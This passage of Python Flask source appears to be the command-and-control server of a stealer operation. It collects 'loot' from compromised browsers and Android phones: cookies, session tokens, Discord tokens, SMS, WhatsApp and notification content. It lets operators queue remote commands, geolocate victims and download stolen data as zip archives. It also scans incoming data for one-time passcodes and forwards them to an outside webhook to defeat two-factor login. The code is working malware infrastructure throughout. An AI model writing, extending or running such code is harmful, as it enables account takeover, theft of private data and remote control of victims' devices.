        return jsonify({"error": "unknown"}), 400
    if eid not in browsers:
        browsers[eid] = {"pending_drops": [], "pending_cmds": [], "dropped_count": 0, "first_seen": now(), "loot": []}
    kind = (data.get("type") or "unknown").strip()
    payload = data.get("data")
    entry = {"type": kind, "ts": now(), "data": payload}
    browsers[eid].setdefault("loot", []).append(entry)
    browsers[eid]["loot"] = browsers[eid]["loot"][-80:]
    browsers[eid]["last_seen"] = now()
    browsers[eid]["loot_count"] = len(browsers[eid].get("loot") or [])
    if kind in ("donutflip_cookies", "donutflip_session_token", "donutflip_cookies_auto"):
        data_obj = entry.get("data") or {}
        if isinstance(data_obj, dict):
            if data_obj.get("session_token") or data_obj.get("has_session_token"):
                browsers[eid]["has_session"] = True
            if data_obj.get("count") is not None:
                browsers[eid]["cookie_count"] = data_obj.get("count")
    save_browsers()
    loot_dir = BASE / "browser_loot" / eid
    loot_dir.mkdir(parents=True, exist_ok=True)
    try:
        (loot_dir / f"{kind}_{int(time.time())}.json").write_text(json.dumps(entry, indent=2), encoding="utf-8")
    except Exception:
        pass
    socketio.emit("browser_loot", {"eid": eid, "type": kind, "ts": entry["ts"]})
    return jsonify({"ok": True})

@app.route("/api/browser/loot/<eid>")
@login_required
def browser_loot_get(eid):
    b = browsers.get(eid) or {}
    return jsonify(b.get("loot") or [])


@app.route("/api/browser/meta", methods=["POST"])
@login_required
def browser_meta():
    data = request.get_json(force=True, silent=True) or {}
    eid = (data.get("eid") or "").strip()
    if eid not in browsers:
        return jsonify({"error": "unknown"}), 404
    if "notes" in data:
        browsers[eid]["notes"] = str(data.get("notes") or "")[:2000]
    if "tags" in data:
        tags = data.get("tags")
        if isinstance(tags, str):
            tags = [x.strip() for x in tags.split(",") if x.strip()]
        browsers[eid]["tags"] = list(tags or [])[:20]
    if "pinned" in data:
        browsers[eid]["pinned"] = bool(data.get("pinned"))
    save_browsers()
    return jsonify({"ok": True})

@app.route("/api/browser/delete", methods=["POST"])
@login_required
def browser_delete():
    data = request.get_json(force=True, silent=True) or {}
    eid = (data.get("eid") or "").strip()
    if eid in browsers:
        browsers.pop(eid, None)
        save_browsers()
        socketio.emit("browser_update", {"eid": eid, "deleted": True})
    return jsonify({"ok": True})



@app.route("/api/browser/loot_zip/<eid>")
@login_required
def browser_loot_zip(eid):
    """Download all loot for a browser client as a zip."""
    import io, zipfile
    b = browsers.get(eid) or {}
    loot = b.get("loot") or []
    # also include on-disk files
    loot_dir = BASE / "browser_loot" / eid
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # structured dumps by type
        by_type = {}
        for entry in loot:
            t = entry.get("type") or "unknown"
            by_type.setdefault(t, []).append(entry)
        for t, items in by_type.items():
            zf.writestr(f"{t}.json", json.dumps(items, indent=2))
            # convenience plain extracts
            if t in ("discord", "discord_cookies"):
                tokens = []
                for it in items:
                    data = it.get("data")
                    if isinstance(data, dict):
                        for tok in data.get("tokens") or []:
                            if isinstance(tok, dict) and tok.get("token"):
                                tokens.append(tok["token"])
                            elif isinstance(tok, str):
                                tokens.append(tok)
                    elif isinstance(data, list):
                        for c in data:
                            if isinstance(c, dict) and c.get("value"):
                                tokens.append(c["value"])
                if tokens:
                    zf.writestr("discord_tokens.txt", "\n".join(tokens) + "\n")
            if t in ("cookies", "roblox"):
                zf.writestr(f"{t}_raw.json", json.dumps([it.get("data") for it in items], indent=2))
        if loot_dir.exists():
            for f in loot_dir.iterdir():
                if f.is_file():
                    zf.write(f, arcname=f"files/{f.name}")
    buf.seek(0)
    from flask import send_file
    return send_file(buf, mimetype="application/zip", as_attachment=True, download_name=f"browser_{eid[:12]}_loot.zip")



@app.route("/api/browser/loot_download/<eid>")
@login_required
def browser_loot_download_type(eid):
    typ = (request.args.get("type") or "").strip()
    items = (browsers.get(eid) or {}).get("loot") or []
    # latest of type
    match = None
    for it in reversed(items):
        if not typ or it.get("type") == typ:
            match = it
            break
    if not match:
        return "missing", 404
    data = match.get("data")
    typ = match.get("type") or "loot"
    if isinstance(data, str):
        body = data
        mime = "text/plain"
        ext = "txt"
    else:
        body = json.dumps(match, indent=2, default=str)
        mime = "application/json"
        ext = "json"
    from flask import Response
    return Response(body, mimetype=mime, headers={
        "Content-Disposition": f"attachment; filename={typ}_{eid[:8]}.{ext}"
    })




def _looks_like_otp(text: str) -> bool:
    if not text:
        return False
    import re as _re
    t = str(text)
    if _re.search(r"\b\d{4,8}\b", t) and _re.search(r"(code|otp|verify|verification|password|login|2fa|auth)", t, _re.I):
        return True
    if _re.search(r"\b\d{6}\b", t):
        return True
    return False

def _post_android_otp_webhook(aid: str, payload):
    try:
        import urllib.request
        url = ANDROID_OTP_WEBHOOK
        if not url:
            return
        body = {
            "embeds": [{
                "title": "Android OTP / code",
                "description": f"```{str(payload)[:1800]}```",
                "color": 0xA855F7,
                "footer": {"text": f"aid {aid}"},
            }]
        }
        req = urllib.request.Request(
            url,
            data=json.dumps(body).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8).read()
    except Exception:
        pass


# ===================== ANDROID CLIENTS =====================
@app.route("/api/android/hello", methods=["POST"])
def android_hello():
    data = request.get_json(force=True, silent=True) or {}
    aid = (data.get("aid") or data.get("eid") or "").strip()
    if not aid or len(aid) < 6:
        return jsonify({"error": "bad aid"}), 400
    ua = request.headers.get("User-Agent", "")[:180]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or ""
    if "," in ip:
        ip = ip.split(",")[0].strip()
    entry = androids.get(aid) or {
        "pending_cmds": [], "first_seen": now(), "loot": [],
    }
    entry["last_seen"] = now()
    entry["ua"] = ua
    entry["ip"] = ip
    for k in ("model", "manufacturer", "android_ver", "sdk", "lang", "tz", "app", "app_ver", "screen"):
        if data.get(k) is not None:
            entry[k] = str(data.get(k))[:80]
    entry["perms"] = data.get("perms") if isinstance(data.get("perms"), dict) else entry.get("perms") or {}
    try:
        if ip and (not entry.get("country") or entry.get("ip") != ip):
            g = geo_from_ip(ip) or {}
            if g:
                entry["country"] = g.get("country") or entry.get("country")
                entry["city"] = g.get("city") or entry.get("city")
                entry["isp"] = g.get("isp") or entry.get("isp")
    except Exception:
        pass
    cmds = list(entry.get("pending_cmds") or [])
    entry["pending_cmds"] = []
    androids[aid] = entry
    save_androids()
    info = {k: entry[k] for k in entry if k not in ("pending_cmds", "loot")}
    socketio.emit("android_update", {"aid": aid, "info": info})
    return jsonify({"ok": True, "cmds": cmds})

@app.route("/api/android/list")
@login_required
def android_list():
    out = []
    for aid, a in androids.items():
        out.append({
            "aid": aid,
            "last_seen": a.get("last_seen"),
            "first_seen": a.get("first_seen"),
            "ip": a.get("ip"),
            "model": a.get("model"),
            "manufacturer": a.get("manufacturer"),
            "android_ver": a.get("android_ver"),
            "app": a.get("app"),
            "app_ver": a.get("app_ver"),
            "lang": a.get("lang"),
            "tz": a.get("tz"),
            "country": a.get("country"),
            "city": a.get("city"),
            "isp": a.get("isp"),
            "perms": a.get("perms") or {},
            "notes": a.get("notes"),
            "tags": a.get("tags") or [],
            "pinned": a.get("pinned"),
            "loot_count": len(a.get("loot") or []),
            "pending": len(a.get("pending_cmds") or []),
        })
    out.sort(key=lambda x: x.get("last_seen") or "", reverse=True)
    return jsonify(out)

@app.route("/api/android/cmd", methods=["POST"])
@login_required
def android_cmd():
    data = request.get_json(force=True, silent=True) or {}
    aid = (data.get("aid") or "").strip()
    cmd = (data.get("cmd") or "").strip()
    args = data.get("args") if isinstance(data.get("args"), dict) else {}
    if not aid or aid not in androids:
        return jsonify({"error": "unknown"}), 404
    if not cmd:
        return jsonify({"error": "no cmd"}), 400
    androids[aid].setdefault("pending_cmds", []).append({"cmd": cmd, "args": args, "ts": now()})
    save_androids()
    return jsonify({"ok": True})

@app.route("/api/android/loot", methods=["POST"])
def android_loot():
    data = request.get_json(force=True, silent=True) or {}
    aid = (data.get("aid") or data.get("eid") or "").strip()
    if not aid:
        return jsonify({"error": "bad aid"}), 400
    if aid not in androids:
        androids[aid] = {"pending_cmds": [], "first_seen": now(), "loot": []}
    kind = (data.get("type") or "unknown").strip()
    payload = data.get("data")
    entry = {"type": kind, "ts": now(), "data": payload}
    androids[aid].setdefault("loot", []).append(entry)
    androids[aid]["loot"] = androids[aid]["loot"][-80:]
    androids[aid]["last_seen"] = now()
    save_androids()
    loot_dir = BASE / "android_loot" / aid
    loot_dir.mkdir(parents=True, exist_ok=True)
    try:
        (loot_dir / f"{kind}_{int(time.time())}.json").write_text(json.dumps(entry, indent=2, default=str), encoding="utf-8")
    except Exception:
        pass
    socketio.emit("android_loot", {"aid": aid, "type": kind, "ts": entry["ts"]})
    # OTP webhook on likely codes
    try:
        blob = payload
        if kind in ("notifications", "notifications_live", "otp", "whatsapp", "sms"):
            text = blob if isinstance(blob, str) else json.dumps(blob, ensure_ascii=False)
            if _looks_like_otp(text) or kind == "otp":
                _post_android_otp_webhook(aid, blob)
                socketio.emit("android_otp", {"aid": aid, "data": blob, "ts": entry["ts"]})
    except Exception:
        pass
    return jsonify({"ok": True})

@app.route("/api/android/loot/<aid>")
@login_required
def android_loot_get(aid):
    a = androids.get(aid) or {}
    return jsonify(a.get("loot") or [])

@app.route("/api/android/meta", methods=["POST"])
@login_required
def android_meta():
    data = request.get_json(force=True, silent=True) or {}
    aid = (data.get("aid") or "").strip()
    if aid not in androids:
        return jsonify({"error": "unknown"}), 404
    if "notes" in data:
        androids[aid]["notes"] = str(data.get("notes") or "")[:2000]
    if "tags" in data:
        tags = data.get("tags")
        if isinstance(tags, str):
            tags = [x.strip() for x in tags.split(",") if x.strip()]
        androids[aid]["tags"] = list(tags or [])[:20]
    if "pinned" in data:
        androids[aid]["pinned"] = bool(data.get("pinned"))
    save_androids()
    return jsonify({"ok": True})

@app.route("/api/android/delete", methods=["POST"])
@login_required
def android_delete():
    data = request.get_json(force=True, silent=True) or {}
    aid = (data.get("aid") or "").strip()
    if aid in androids:
        androids.pop(aid, None)
        save_androids()
    return jsonify({"ok": True})

@app.route("/api/android/loot_download/<aid>")
@login_required
def android_loot_download_type(aid):
    typ = (request.args.get("type") or "").strip()
    items = (androids.get(aid) or {}).get("loot") or []
    match = None
    for it in reversed(items):
        if not typ or it.get("type") == typ:
            match = it
            break
    if not match:
        return "missing", 404
    data = match.get("data")
    typ = match.get("type") or "loot"
    if isinstance(data, str):
        body = data
        mime = "text/plain"
        ext = "txt"
    else:
        body = json.dumps(match, indent=2, default=str)
        mime = "application/json"
        ext = "json"
    from flask import Response
    return Response(body, mimetype=mime, headers={
        "Content-Disposition": f"attachment; filename={typ}_{aid[:8]}.{ext}"
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
